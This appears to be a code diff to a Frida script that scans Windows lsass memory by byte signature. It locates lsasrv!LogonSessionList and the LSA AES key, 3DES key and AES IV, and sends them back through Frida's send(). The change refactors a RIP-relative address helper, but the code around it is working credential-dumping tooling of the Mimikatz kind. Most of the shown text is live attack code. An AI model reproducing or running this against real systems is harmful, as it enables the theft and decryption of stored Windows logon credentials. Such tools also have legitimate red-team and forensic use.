@@ -4,35 +4,31 @@
 * Changes to the memory layout of lsass may require new signatures and offsets to be calculated.
 */
 
-function findDereferencedAddress(ptr, offset) {
-	// Given a pointer to some signature address and an offset, extract the target address from an instruction that dereferences it. 
+function findDereferencedAddress(ptr) {
+	// Given a pointer to a RIP-relative LEA instruction, extract the address that the instruction dereferences.
 	// This is used to identify the location of global variables in lsass memory by finding instructions that dereference them. 
-	
-	// Calculate the offset to the target instruction.
-	var targetAddress = ptr.add(offset);
-	var targetInstruction = Instruction.parse(targetAddress);
-	
-	// Target instruction should look something like this
+	// Target instruction should look something like this:
 	// <signature> + <offset>: lea rcx, [rip + 0x118061]
-	// We need to extract the %rip offset and resolve it into an actual address.
-	
-	// Sanity check for the lea instruction
-	if (targetInstruction.toString().includes("lea ")) {
-		//Frida parses the instruction for us and separates out operands - no janky offset math required :)
-		var operand = targetInstruction.operands[1];
-		//Sanity check to make sure it's a RIP-relative offset, not some other register.
-		if (operand["value"]["base"] !== "rip") {
-			return null;
-		}
-		//Get the offset.
-		var ripOffsetInt = operand["value"]["disp"];
-		var ripOffset = new NativePointer(ripOffsetInt);
-		// Finally, we need to convert the offset into an actual address.
-		// To do this, find what RIP will be just after our target instruction, then add the offset.
-		var rip = targetInstruction.next;
-		var target = rip.add(ripOffset);
-		return target;
+
+	var targetInstruction = Instruction.parse(ptr);
+	// Sanity check for the presence of the LEA mnemonic.
+	if (targetInstruction.mnemonic !== "lea") {
+		return null;
 	}
+	// The second operand of the instruction is the RIP-relative address (i.e. "[rip + 0x118061]").
+	var operand = targetInstruction.operands[1];
+	// Sanity check to make sure it's a RIP-relative offset, not relative to some other register.
+	if (operand["value"]["base"] !== "rip") {
+		return null;
+	}
+	// Get the offset.
+	var ripOffsetInt = operand["value"]["disp"];
+	var ripOffset = new NativePointer(ripOffsetInt);
+	// Finally, we need to convert the offset into an actual address.
+	// To do this, find what RIP will be just after our target instruction, then add the offset.
+	var rip = targetInstruction.next;
+	var target = rip.add(ripOffset);
+	return target;
 }
 
 //lsasrv!LogonSessionList parsing
@@ -142,7 +138,8 @@ var LsaInitializeProtectedMemory = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d
 // scanning for WLsaEnumerateLogonSession(), used to identify lsasrv!LogonSessionList
 Memory.scan(lsasrv.base, lsasrv.size, WLsaEnumerateLogonSession, {
 	onMatch(signature, size) {
-		var logonSessionList = findDereferencedAddress(signature, 0x14);
+		var lea = signature.add(0x14);
+		var logonSessionList = findDereferencedAddress(lea);
 		var sessions = getLogonSessions(logonSessionList, 100);
 		
 		for (var s of sessions) {
@@ -165,17 +162,20 @@ Memory.scan(lsasrv.base, lsasrv.size, WLsaEnumerateLogonSession, {
 // scanning for LsaInitializeProtectedMemory(), used to identify lsasrv!hAesKey and lsasrv!h3DesKey
 Memory.scan(lsasrv.base, lsasrv.size, LsaInitializeProtectedMemory, {
 	onMatch(signature, size) {
-		var aesKeyPtr = findDereferencedAddress(signature, 0xD);
+		var lea = signature.add(0xD);
+		var aesKeyPtr = findDereferencedAddress(lea);
 		var aesKey = getKey(aesKeyPtr);
 		var output  = { "type": "aeskey" }
 		send(output, aesKey);
 
-		var desKeyPtr = findDereferencedAddress(signature, -0x5C);
+		lea = signature.add(-0x5C);
+		var desKeyPtr = findDereferencedAddress(lea);
 		var desKey = getKey(desKeyPtr);
 		output = { "type": "3deskey" }
 		send(output, desKey);
 		
-		var aesIVPtr = findDereferencedAddress(signature, 0x40);
+		lea = signature.add(0x40);
+		var aesIVPtr = findDereferencedAddress(lea);
 		var aesIV = getAesIV(aesIVPtr);
 		output = { "type": "aes_iv" }
 		send(output, aesIV);
